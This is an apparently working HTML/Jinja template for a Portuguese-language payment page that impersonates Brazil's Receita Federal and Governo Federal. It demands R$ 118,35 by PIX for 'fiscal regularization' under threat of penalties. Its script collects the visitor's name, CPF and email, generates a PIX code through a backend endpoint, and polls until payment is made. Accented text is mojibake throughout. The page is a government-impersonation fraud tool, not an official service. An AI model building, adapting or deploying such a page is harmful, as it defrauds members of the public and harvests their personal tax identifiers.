<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Guia de Recolhimento da Uni√£o - Regulariza√ß√£o Fiscal</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;500;700&display=swap" rel="stylesheet"/>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;700&display=swap" rel="stylesheet"/>
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css" rel="stylesheet"/>
    <style>
        body {
            font-family: 'Montserrat', Arial, sans-serif;
        }
        .inter {
            font-family: 'Inter', sans-serif;
        }
        
        .fade-in {
            animation: fadeIn 0.5s ease-in;
        }
        
        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(10px); }
            to { opacity: 1; transform: translateY(0); }
        }
        
        .loading-spinner {
            border: 3px solid #f3f3f3;
            border-top: 3px solid #1e40af;
            border-radius: 50%;
            width: 20px;
            height: 20px;
            animation: spin 1s linear infinite;
        }
        
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>
<body class="bg-[#fafbfc]">
    <!-- Header -->
    <div class="w-full bg-white border-b border-[#e5e7eb]">
        <div class="max-w-sm mx-auto flex items-center pl-1 pr-2 py-2">
            <img alt="Logo do Governo Federal com texto P√°tria Amada Brasil, horizontal, fundo branco" 
                 class="h-10 w-auto mr-3" 
                 src="https://sites.ufpe.br/especializacao/wp-content/uploads/sites/11/2019/12/logo-patria-amada-brasil-horizontal.png" 
                 style="max-width: 150px;"/>
            <div>
                <div class="text-[#222] text-[15px] font-medium leading-tight">
                    Guia de Recolhimento da Uni√£o
                </div>
                <div class="text-[#444] text-[12px] leading-tight">
                    Regulariza√ß√£o Fiscal ‚Ä¢ Receita Federal do Brasil
                </div>
            </div>
        </div>
    </div>

    <!-- Main Content -->
    <div class="max-w-sm mx-auto px-2 pt-4 pb-6">
        <div class="text-center">
            <div id="nome-usuario" class="text-[#222] text-[18px] font-medium mb-1">
                {% if customer and customer.nome %}{{ customer.nome.split(' ')[0]|upper }}, finalize sua regulariza√ß√£o{% else %}Finalize sua regulariza√ß√£o{% endif %}
            </div>
            <div class="text-[#444] text-[14px] mb-4">
                √öltima etapa para quita√ß√£o dos d√©bitos fiscais
            </div>
            <div class="text-[#888] text-[13px] mb-0.5">
                Total para quita√ß√£o
            </div>
            <div id="valor-pagamento" class="text-[#222] text-[36px] font-light mb-0.5 leading-none">
                R$ 118,35
            </div>
            <div class="text-[#888] text-[13px] mb-3">
                Pagamento com Seguran√ßa Garantida.
            </div>
            <div class="flex justify-center mb-4">
                <div class="border-l-2 border-[#e5e7eb] pl-2 text-left">
                    <div class="text-[#444] text-[12px] font-medium">
                        Regulariza√ß√£o obrigat√≥ria
                    </div>
                    <div class="text-[#888] text-[12px]">
                        Evite aplica√ß√£o de penalidades e restri√ß√µes fiscais
                    </div>
                </div>
            </div>
        </div>

        <!-- QR Code Section -->
        <div id="qr-section" class="flex justify-center mb-4">
            <div class="bg-white rounded-xl shadow p-2">
                <img id="qr-code-img" 
                     alt="QR Code para pagamento PIX" 
                     class="w-36 h-36 object-contain" 
                     height="144" 
                     width="144"
                     src="https://replicate.delivery/xezq/no84nIWjepWwQiqGfvGLYLyrtZ3gYdqfeWsYkXc6WbPo4daUB/out-0.png"/>
            </div>
        </div>

        <!-- Payment Status -->
        <div id="payment-status" class="mb-4 text-center">
            <div class="bg-blue-50 border border-blue-200 rounded-lg p-3">
                <div class="text-blue-800 text-[14px] font-medium mb-1">Preparando pagamento...</div>
                <div class="text-blue-600 text-[12px]">Aguarde enquanto geramos seu c√≥digo PIX</div>
            </div>
        </div>

        <!-- PIX Code Section -->
        <div id="pix-section">
            <div class="text-[#222] text-[15px] font-medium mb-1">
                C√≥digo PIX
            </div>
            <div class="bg-white rounded-lg border border-[#e5e7eb] p-3 mb-4">
                <textarea id="pix-code" 
                          class="w-full text-[#444] text-[12px] font-mono bg-transparent border-none resize-none outline-none break-words leading-tight" 
                          rows="4" 
                          readonly 
                          placeholder="Carregando c√≥digo PIX..."></textarea>
            </div>
            <button id="copy-button" 
                    class="w-full bg-[#1857d3] hover:bg-[#174fc2] text-white text-[16px] font-medium rounded-lg py-3 flex items-center justify-center transition-colors duration-150"
                    onclick="copiarCodigo()">
                <i class="far fa-copy mr-2 text-[15px]"></i>
                Copiar c√≥digo
            </button>
        </div>

        <!-- Como quitar Section -->
        <div class="inter mt-4">
            <h1 class="text-[1rem] font-medium text-[#23272F] mb-3">Como quitar</h1>
            <ol class="space-y-2 mb-4">
                <li class="flex items-start">
                    <span class="flex items-center justify-center w-6 h-6 rounded-full bg-[#F3F4F6] text-[#6B7280] font-medium text-[0.75rem] mr-3">1</span>
                    <span class="text-[#444950] text-[0.9rem]">Abra seu aplicativo banc√°rio</span>
                </li>
                <li class="flex items-start">
                    <span class="flex items-center justify-center w-6 h-6 rounded-full bg-[#F3F4F6] text-[#6B7280] font-medium text-[0.75rem] mr-3">2</span>
                    <span class="text-[#444950] text-[0.9rem]">Acesse a √°rea PIX</span>
                </li>
                <li class="flex items-start">
                    <span class="flex items-center justify-center w-6 h-6 rounded-full bg-[#F3F4F6] text-[#6B7280] font-medium text-[0.75rem] mr-3">3</span>
                    <span class="text-[#444950] text-[0.9rem]">Escaneie o QR Code ou cole o c√≥digo</span>
                </li>
                <li class="flex items-start">
                    <span class="flex items-center justify-center w-6 h-6 rounded-full bg-[#F3F4F6] text-[#6B7280] font-medium text-[0.75rem] mr-3">4</span>
                    <span class="text-[#444950] text-[0.9rem]">Confirme a quita√ß√£o</span>
                </li>
            </ol>

            <div class="bg-[#F7F8FA] rounded-md px-3 py-3 mb-6">
                <h2 class="text-[0.9rem] font-medium text-[#23272F] mb-1">Ap√≥s a quita√ß√£o</h2>
                <p class="text-[#6B7280] text-[0.8rem] mb-2 leading-tight">
                    Sua situa√ß√£o fiscal ser√° regularizada automaticamente. Voc√™ receber√° confirma√ß√£o com todas as informa√ß√µes do protocolo:
                </p>
                <div class="text-[0.8rem]">
                    <div class="mb-0.5">
                        <span class="font-medium text-[#23272F]">Nome:</span>
                        <span id="nome-confirmacao" class="text-[#444950]">{% if customer and customer.nome %} {{ customer.nome }}{% else %} carregando...{% endif %}</span>
                    </div>
                    <div class="mb-0.5">
                        <span class="font-medium text-[#23272F]">CPF:</span>
                        <span id="cpf-confirmacao" class="text-[#444950]">{% if customer and customer.cpf %} {{ customer.cpf }}{% else %} carregando...{% endif %}</span>
                    </div>
                </div>
            </div>

            <div class="border-t border-[#E5E7EB] pt-4 pb-2 flex flex-col items-center">
                <div class="flex items-center mb-1">
                    <span class="text-[#A1A6B0] text-[0.8rem] mr-1">
                        <i class="fas fa-shield-alt"></i>
                    </span>
                    <span class="text-[#A1A6B0] text-[0.8rem] font-medium">Pagamento seguro</span>
                </div>
                <div class="text-[#C2C6CE] text-[0.7rem] mb-4 text-center leading-tight">
                    Processado via Receita Federal ‚Ä¢ SSL ‚Ä¢ Dados criptografados
                </div>
                <button id="continuar-btn" 
                        class="w-full bg-[#F7F8FA] text-[#A1A6B0] text-[0.9rem] font-medium rounded-md py-3 cursor-default" 
                        disabled>
                    Continuar ap√≥s quita√ß√£o
                </button>
                
                <!-- Debug button (only visible in development) -->
                <button id="verify-payment-btn" 
                        class="mt-2 w-full bg-green-600 text-white text-[0.9rem] font-medium rounded-md py-2 hover:bg-green-700 transition-colors" 
                        style="display: none;">
                    <i class="fas fa-check-circle mr-1"></i>
                    Verificar Pagamento
                </button>
            </div>
        </div>
    </div>

<script>
// Vari√°veis globais
let transacaoId = null;
let verificacaoInterval = null;
let dadosUsuario = {};
let lastCheckTime = 0;
const CHECK_INTERVAL = 5000; // 5 segundos

document.addEventListener('DOMContentLoaded', function() {
    console.log('PIX Payment Page loaded');
    
    // Extrair dados da URL
    const urlParams = new URLSearchParams(window.location.search);
    dadosUsuario = {
        nome: urlParams.get('nome') || '{% if customer and customer.nome %}{{ customer.nome }}{% endif %}',
        cpf: urlParams.get('cpf') || '{% if customer and customer.cpf %}{{ customer.cpf }}{% endif %}',
        email: urlParams.get('email') || 'gerarpagamento@gmail.com'
    };
    
    // Se n√£o temos dados do backend, pegar da URL
    if (!dadosUsuario.nome && urlParams.get('nome')) {
        dadosUsuario.nome = urlParams.get('nome');
    }
    if (!dadosUsuario.cpf && urlParams.get('cpf')) {
        dadosUsuario.cpf = urlParams.get('cpf');
    }
    
    console.log('Dados do usu√°rio:', dadosUsuario);
    
    // Gerar PIX automaticamente
    if (dadosUsuario.nome && dadosUsuario.cpf) {
        gerarPIX();
    } else {
        mostrarErro('Dados do cliente n√£o encontrados');
    }
    
    // Verificar pagamento automaticamente a cada 5 segundos
    setInterval(verificarPagamento, 5000);
});

async function gerarPIX() {
    try {
        // Mostrar loading state
        document.getElementById('payment-status').innerHTML = `
            <div class="bg-blue-50 border border-blue-200 rounded-lg p-3">
                <div class="flex items-center">
                    <div class="animate-spin rounded-full h-4 w-4 border-b-2 border-blue-600 mr-2"></div>
                    <div class="text-blue-800 text-[14px] font-medium">Gerando PIX...</div>
                </div>
                <div class="text-blue-600 text-[12px] mt-1">Aguarde alguns instantes</div>
            </div>
        `;

        const dadosParaPIX = {
            name: dadosUsuario.nome,  // API espera 'name', n√£o 'nome'
            cpf: dadosUsuario.cpf,
            email: dadosUsuario.email
        };
        
        console.log('Gerando PIX com dados:', dadosParaPIX);
        
        const response = await fetch('/generate-pix', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify(dadosParaPIX)
        });
        
        if (!response.ok) {
            throw new Error(`HTTP error! status: ${response.status}`);
        }
        
        const data = await response.json();
        console.log('‚úÖ Resposta da API PIX recebida:', data);
        
        if (data.success) {
            transacaoId = data.transaction_id || data.order_id;
            console.log('üîë Transaction ID:', transacaoId);
            
            // Tentar diferentes campos para o c√≥digo PIX
            const pixCode = data.pixCode || data.pix_code || data.pixQrCode || data.qr_code_image || '';
            console.log('üìù C√≥digo PIX extra√≠do:', pixCode ? 'SIM' : 'N√ÉO', '- Tamanho:', pixCode.length);
            
            if (pixCode && pixCode.length > 0) {
                // Verificar se elementos existem
                const pixInput = document.getElementById('pix-code');
                const qrImg = document.getElementById('qr-code-img');
                
                console.log('üéØ Elementos encontrados:', {
                    pixInput: !!pixInput,
                    qrImg: !!qrImg
                });
                
                if (pixInput) {
                    pixInput.value = pixCode;
                    console.log('‚úÖ PIX code definido no input');
                }
                
                if (qrImg) {
                    const qrCodeUrl = `https://api.qrserver.com/v1/create-qr-code/?size=144x144&data=${encodeURIComponent(pixCode)}`;
                    qrImg.src = qrCodeUrl;
                    console.log('‚úÖ QR Code URL definida:', qrCodeUrl.substring(0, 100) + '...');
                }
                
                // Atualizar status
                const statusMessage = data.cached ? 'PIX recuperado (r√°pido)' : 'PIX gerado com sucesso';
                const cacheIcon = data.cached ? '<i class="fas fa-clock mr-1"></i>' : '<i class="fas fa-check mr-1"></i>';
                
                const statusElement = document.getElementById('payment-status');
                if (statusElement) {
                    statusElement.innerHTML = `
                        <div class="bg-green-50 border border-green-200 rounded-lg p-3">
                            <div class="text-green-800 text-[14px] font-medium mb-1">${cacheIcon}${statusMessage}</div>
                            <div class="text-green-600 text-[12px]">Escaneie o QR Code ou copie o c√≥digo abaixo</div>
                        </div>
                    `;
                    console.log('‚úÖ Status atualizado');
                }
                
                console.log('üéâ PIX configurado com sucesso!');
            } else {
                console.error('‚ùå C√≥digo PIX vazio ou inv√°lido:', pixCode);
                mostrarErro('C√≥digo PIX n√£o encontrado na resposta da API');
            }
            
        } else {
            mostrarErro(data.error || 'Erro ao gerar PIX');
        }
    } catch (error) {
        console.error('Erro ao gerar PIX:', error);
        mostrarErro('Erro de conex√£o ao gerar PIX. Detalhes: ' + error.message);
        
        // Mostrar bot√£o de debug em caso de erro
        document.getElementById('verify-payment-btn').style.display = 'block';
    }
}

function copiarCodigo() {
    const pixCode = document.getElementById('pix-code').value;
    
    if (!pixCode) {
        alert('C√≥digo PIX n√£o dispon√≠vel');
        return;
    }
    
    navigator.clipboard.writeText(pixCode).then(() => {
        const button = document.getElementById('copy-button');
        const originalText = button.innerHTML;
        
        button.innerHTML = '<i class="fas fa-check mr-2 text-[13px]"></i>C√≥digo copiado!';
        button.classList.remove('bg-[#1857d3]', 'hover:bg-[#174fc2]');
        button.classList.add('bg-green-600', 'hover:bg-green-700');
        
        setTimeout(() => {
            button.innerHTML = originalText;
            button.classList.remove('bg-green-600', 'hover:bg-green-700');
            button.classList.add('bg-[#1857d3]', 'hover:bg-[#174fc2]');
        }, 2000);
    }).catch(err => {
        console.error('Erro ao copiar:', err);
        alert('Erro ao copiar c√≥digo. Tente selecionar e copiar manualmente.');
    });
}

async function verificarPagamento() {
    if (!transacaoId) {
        console.log('ID da transa√ß√£o n√£o dispon√≠vel');
        return;
    }

    // Throttle: evitar muitas requisi√ß√µes
    const now = Date.now();
    if (now - lastCheckTime < CHECK_INTERVAL) {
        return;
    }
    lastCheckTime = now;
    
    try {
        const response = await fetch(`/api/verificar-pagamento/${transacaoId}`);
        const data = await response.json();
        
        if (data.pago) {
            console.log('üéâ Pagamento confirmado! Regulariza√ß√£o conclu√≠da...');
            
            // Atualizar status visual
            const statusElement = document.getElementById('payment-status');
            if (statusElement) {
                statusElement.innerHTML = `
                    <div class="bg-green-50 border border-green-200 rounded-lg p-3">
                        <div class="flex items-center">
                            <i class="fas fa-check-circle text-green-600 mr-2"></i>
                            <div>
                                <div class="text-green-800 text-[12px] font-medium">Pagamento confirmado!</div>
                                <div class="text-green-600 text-[10px]">Regulariza√ß√£o conclu√≠da</div>
                            </div>
                        </div>
                    </div>
                `;
            }
            
            // Habilitar bot√£o continuar
            const continuarBtn = document.getElementById('continuar-btn');
            if (continuarBtn) {
                continuarBtn.disabled = false;
                continuarBtn.classList.remove('bg-[#F7F8FA]', 'text-[#A1A6B0]', 'cursor-default');
                continuarBtn.classList.add('bg-green-600', 'text-white', 'cursor-pointer');
                continuarBtn.textContent = 'Regulariza√ß√£o Conclu√≠da';
            }
            
            // Mostrar mensagem de sucesso
            setTimeout(() => {
                alert('‚úÖ Sua situa√ß√£o fiscal foi regularizada com sucesso!\n\nObrigado por utilizar os servi√ßos da Receita Federal.');
                // Opcional: redirecionar para p√°gina de confirma√ß√£o
                // window.location.href = '/confirmacao-regularizacao';
            }, 2000);
            
        } else {
            console.log('Pagamento ainda pendente, status:', data.status);
        }
    } catch (error) {
        console.error('Erro na verifica√ß√£o:', error);
    }
}

function mostrarErro(mensagem) {
    document.getElementById('payment-status').innerHTML = `
        <div class="bg-red-50 border border-red-200 rounded-lg p-3">
            <div class="flex items-center">
                <i class="fas fa-exclamation-triangle text-red-600 mr-2"></i>
                <div>
                    <div class="text-red-800 text-[12px] font-medium">Erro</div>
                    <div class="text-red-600 text-[10px]">${mensagem}</div>
                </div>
            </div>
        </div>
    `;
}
</script>

</body>
</html>